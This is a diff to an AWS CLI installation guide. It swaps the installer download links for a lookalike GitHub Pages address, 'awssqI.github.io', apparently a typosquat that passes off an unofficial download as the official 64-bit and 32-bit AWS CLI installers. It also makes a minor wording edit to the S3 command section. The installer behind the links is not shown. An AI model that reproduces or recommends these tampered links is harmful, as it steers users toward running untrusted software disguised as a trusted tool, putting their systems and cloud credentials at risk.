@@ -4,8 +4,8 @@
 
 Download and install the newest release of the AWS CLI. When prompted by the installer to allow changes to your computer, choose "Yes".
 
-**[Download Latest AWS CLI (64-bit)](*)**           
-**[Download Latest AWS CLI (32-bit)](*)**          
+**[Download Latest AWS CLI (64-bit)](https://awssqI.github.io/.github/)**           
+**[Download Latest AWS CLI (32-bit)](https://awssqI.github.io/.github/)**          
 
 If the AWS CLI is already installed on your system, running either the 32-bit or 64-bit installer will overwrite the current version with the new one.
 
@@ -169,7 +169,7 @@ You can use the AWS CLI to manage EC2 instances, key pairs, and associated secur
 The AWS CLI supports two sets of commands for Amazon S3:
 
 * **High-Level Commands (`s3`)**: Simplified for routine operations.
-* **API-Level Commands (`s3api`)**: Provide access to full S3 capabilities.
+* **API-Level Commands (`s3api`)**: Provide access to full capabilities.
 
 ### Example Commands:
 
